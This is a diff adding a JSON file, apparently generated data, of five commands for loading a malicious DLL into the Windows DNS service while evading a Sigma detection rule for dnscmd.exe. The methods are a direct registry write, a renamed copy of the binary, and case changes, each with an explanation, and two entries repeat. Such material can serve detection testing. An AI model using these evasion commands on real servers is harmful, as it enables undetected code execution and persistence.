@@ -1,0 +1,22 @@
+[
+  {
+    "output": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\" /v ServerLevelPluginDll /t REG_SZ /d \"C:\\path\\to\\your\\malicious.dll\" /f",
+    "explanation": "The Sigma rule specifically monitors for the execution of 'dnscmd.exe' with the '/config' and '/serverlevelplugindll' flags. A direct bypass is to modify the registry key directly using 'reg.exe' or PowerShell's 'Set-ItemProperty'. Since the DNS service reads this path from the registry upon startup, the malicious DLL will still be loaded without ever triggering a process creation event for dnscmd.exe."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\dnscmd.exe C:\\Windows\\Temp\\not_dns.exe && C:\\Windows\\Temp\\not_dns.exe /config /serverlevelplugindll C:\\malicious.dll",
+    "explanation": "The rule uses a selection filter on 'Image' ending with '\\dnscmd.exe'. By copying the legitimate binary to a different location with a different name, the 'Image' field in the process creation log will no longer match the rule's criteria, even though the command-line arguments remain the same."
+  },
+  {
+    "output": "dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL C:\\malicious.dll",
+    "explanation": "While many SIEMs normalize case, some environments may have case-sensitive matching enabled. If the 'Image' or 'CommandLine' filters do not account for variations, using uppercase or mixed-case for the binary name or the specific flags (e.g., /SERVERLEVELPLUGINDLL) might evade simple string-match detections."
+  },
+  {
+    "output": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\" /v ServerLevelPluginDll /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f",
+    "explanation": "The Sigma rule specifically monitors for the execution of 'dnscmd.exe' with specific command-line arguments. An attacker can bypass this by directly modifying the Windows Registry key using 'reg.exe' or PowerShell's 'Set-ItemProperty', achieving the same configuration change without triggering the process-based detection for the DNS management tool."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\dnscmd.exe C:\\Windows\\Temp\\not_dns.exe && C:\\Windows\\Temp\\not_dns.exe /config /serverlevelplugindll C:\\path\\to\\malicious.dll",
+    "explanation": "The rule uses an 'Image|endswith' filter on '\\dnscmd.exe'. By copying the legitimate binary to a different filename or directory, the process creation event will no longer match the image name requirement, even if the command-line arguments remain identical."
+  }
+]
